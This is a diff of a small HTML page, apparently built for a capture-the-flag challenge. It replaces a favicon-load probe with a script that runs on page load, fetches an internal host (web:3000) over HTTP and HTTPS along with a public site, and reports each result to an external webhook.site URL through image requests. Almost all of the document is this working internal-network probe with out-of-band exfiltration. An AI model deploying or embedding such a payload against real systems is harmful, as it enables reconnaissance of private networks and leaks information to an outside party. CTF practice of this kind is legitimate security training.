@@ -3,24 +3,35 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Site Preview Test</title>
+  <title>CTF Network Probe</title>
 </head>
 <body>
-  <h1>CTF Test Page</h1>
-<script>
-const hook = "https://webhook.site/676ec5ae-a5f2-49f7-8044-21c48e3f6a35";
+  <h1>Network Probe</h1>
+  <script>
+    const hook = "https://webhook.site/676ec5ae-a5f2-49f7-8044-21c48e3f6a35";
 
-const img = new Image();
+    function report(name, result) {
+      const url = new URL(hook);
+      url.searchParams.set("test", name);
+      url.searchParams.set("result", result);
+      new Image().src = url.toString();
+    }
 
-img.onload = () => {
-  new Image().src = hook + "?probe=loaded";
-};
+    async function probe(name, url) {
+      try {
+        await fetch(url, {
+          mode: "no-cors",
+          cache: "no-store"
+        });
+        report(name, "fetch-resolved");
+      } catch (e) {
+        report(name, "fetch-error-" + e.name);
+      }
+    }
 
-img.onerror = () => {
-  new Image().src = hook + "?probe=error";
-};
-
-img.src = "http://web:3000/favicon.ico";
-</script>
+    probe("public-https", "https://example.com/");
+    probe("internal-http", "http://web:3000/");
+    probe("internal-https", "https://web:3000/");
+  </script>
 </body>
 </html>
